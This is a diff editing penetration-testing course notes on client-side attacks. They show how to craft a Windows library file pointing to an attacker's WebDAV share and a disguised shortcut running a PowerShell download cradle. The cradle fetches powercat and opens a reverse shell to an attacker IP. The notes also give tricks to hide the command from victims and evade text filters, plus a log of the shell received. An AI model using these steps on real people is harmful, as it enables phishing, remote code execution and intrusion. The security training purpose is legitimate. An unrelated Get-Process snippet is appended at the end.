@@ -265,7 +265,7 @@ In the menu bar, we'll click on File > New Text File. We'll then save the empty 
 
 Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations. The parts are General library information, Library properties, and Library locations.
 
-The listing below contains the namespace7 for the library file. This is the namespace for the version of the library file format starting from Windows 7. The listing also contains the closing tag for the library description. All of the following tags we cover will be added inside the libraryDescription8 tags.
+The listing below contains the namespace for the library file. This is the namespace for the version of the library file format starting from Windows 7. The listing also contains the closing tag for the library description. All of the following tags we cover will be added inside the libraryDescription tags.
 
 ```bash
 <?xml version="1.0" encoding="UTF-8"?>
@@ -276,7 +276,7 @@ The listing below contains the namespace7 for the library file. This is the name
 
     Listing 12 - XML and Library Description Version
 
-Next, we'll add two tags providing information about the library. The name9 tag specifies the name of this library. We must not confuse this with an arbitrary name we can just set randomly. We need to specify the name of the library by providing a DLL name and index. We can use @shell32.dll,-34575 or @windows.storage.dll,-34582 as specified on the Microsoft website. We'll use the latter to avoid any issues with text-based filters that may flag on "shell32". The version10 tag can be set to a numerical value of our choice, for example, 6.
+Next, we'll add two tags providing information about the library. The name tag specifies the name of this library. We must not confuse this with an arbitrary name we can just set randomly. We need to specify the name of the library by providing a DLL name and index. We can use @shell32.dll,-34575 or @windows.storage.dll,-34582 as specified on the Microsoft website. We'll use the latter to avoid any issues with text-based filters that may flag on "shell32". The version tag can be set to a numerical value of our choice, for example, 6.
 
 ```bash
 <name>@windows.storage.dll,-34582</name>
@@ -285,7 +285,7 @@ Next, we'll add two tags providing information about the library. The name9 tag 
 
     Listing 13 - Name and Version Tags of the Library
 
-Next, we'll add the isLibraryPinned11 tag. This element specifies if the library is pinned to the navigation pane in Windows Explorer. For our targets, this may be another small detail to make the whole process feel more genuine and therefore, we'll set it to true. The next tag we'll add is iconReference,12 which determines what icon is used to display the library file. We must specify the value in the same format as the name element. We can use imagesres.dll to choose between all Windows icons. We can use index "-1002" for the Documents folder icon from the user home directories or "-1003" for the Pictures folder icon. We'll provide the latter to make it look more benign.
+Next, we'll add the isLibraryPinned tag. This element specifies if the library is pinned to the navigation pane in Windows Explorer. For our targets, this may be another small detail to make the whole process feel more genuine and therefore, we'll set it to true. The next tag we'll add is iconReference, which determines what icon is used to display the library file. We must specify the value in the same format as the name element. We can use imagesres.dll to choose between all Windows icons. We can use index "-1002" for the Documents folder icon from the user home directories or "-1003" for the Pictures folder icon. We'll provide the latter to make it look more benign.
 
 ```bash
 <isLibraryPinned>true</isLibraryPinned>
@@ -306,9 +306,9 @@ Now, let's add the templateInfo tags, which contain the folderType tags. These t
 
 The next tag marks the beginning of the library locations section. In this section, we specify the storage location where our library file should point to. We'll begin by creating the searchConnectorDescriptionList, tag which contains a list of search connectors defined by searchConnectorDescription. Search connectors are used by library files to specify the connection settings to a remote location. We can specify one or more searchConnectorDescription elements inside the searchConnectorDescriptionList tags. For this example we only specify one.
 
-Inside the description of the search connector, we'll specify information and parameters for our WebDAV share. The first tag we'll add is the isDefaultSaveLocation19 tag with the value set to true. This tag determines the behavior of Windows Explorer when a user chooses to save an item. To use the default behavior and location, we'll set it to true. Next, we'll add the isSupported tag, which is not documented in the Microsoft Documentation webpage, and is used for compatibility. We can set it to false.
+Inside the description of the search connector, we'll specify information and parameters for our WebDAV share. The first tag we'll add is the isDefaultSaveLocation tag with the value set to true. This tag determines the behavior of Windows Explorer when a user chooses to save an item. To use the default behavior and location, we'll set it to true. Next, we'll add the isSupported tag, which is not documented in the Microsoft Documentation webpage, and is used for compatibility. We can set it to false.
 
-The most important tag is url, which we need to point to our previously-created WebDAV share over HTTP. It is contained within the simpleLocation21 tags, which we can use to specify the remote location in a more user-friendly way as the normal locationProvider22 element.
+The most important tag is url, which we need to point to our previously-created WebDAV share over HTTP. It is contained within the simpleLocation tags, which we can use to specify the remote location in a more user-friendly way as the normal locationProvider element.
 
 ```bash
 <searchConnectorDescriptionList>
@@ -343,7 +343,7 @@ We have just reviewed the XML code for all of the sections of our library File. 
 <isDefaultSaveLocation>true</isDefaultSaveLocation>
 <isSupported>false</isSupported>
 <simpleLocation>
-<url>http://192.168.119.2</url>
+<url>http://192.168.45.231</url>
 </simpleLocation>
 </searchConnectorDescription>
 </searchConnectorDescriptionList>
@@ -362,12 +362,10 @@ The library file will modify when the user clicks it.
 Let's create the shortcut on the desktop for the offsec user. For this, we'll right-click on the desktop and click on New then on Shortcut. In the Create Shortcut window, we can enter a path to a program along with arguments, which will be pointed to by the shortcut. We'll point the shortcut to PowerShell and use another download cradle to load PowerCat from our Kali machine and start a reverse shell.
 
 ```bash
-powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
-powercat -c 192.168.119.3 -p 4444 -e powershell"
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.231:8000/powercat.ps1');powercat -c 192.168.45.231 -p 445 -e powershell"
 ```
 
 *If we expect that our victims are tech-savvy enough to actually check where the shortcut files are pointing, we can use a handy trick. Since our provided command looks very suspicious, we could just put a delimiter and benign command behind it to push the malicious command out of the visible area in the file's property menu. If a user were to check the shortcut, they would only see the benign command.*
-
 
 In the next window, let's enter automatic_configuration as the name for the shortcut file and click Finish to create the file.
 
@@ -412,7 +410,7 @@ Now, let's copy automatic_configuration.lnk and config.Library-ms to our WebDAV 
 
 Next, we'll start the Python3 web server on port 8000 to serve powercat.ps1, WsgiDAV for our WebDAV share /home/kali/webdav, and a Netcat listener on port 4444.
 
-To upload the library file to the SMB share, we'll use smbclient25 with the -c parameter to specify the put config.Library-ms command. Before we execute smbclient, we need to change our current directory to the library file's directory. We'll also delete the previously-created test.txt file from the WebDAV share.
+To upload the library file to the SMB share, we'll use smbclient with the -c parameter to specify the put config.Library-ms command. Before we execute smbclient, we need to change our current directory to the library file's directory. We'll also delete the previously-created test.txt file from the WebDAV share.
 ```bash
 kali@kali:~$ cd webdav
 
@@ -447,3 +445,9 @@ hr137\hsmith
 Listing 22 shows that we successfully received a reverse shell with our Library and shortcut files.
 
 We could also have combined this technique with our previous Office macro attack, or any other type of client-side attacks.
+
+#### Get Process Information from Loopback
+
+```bash
+Get-Process -Id 1234
+```
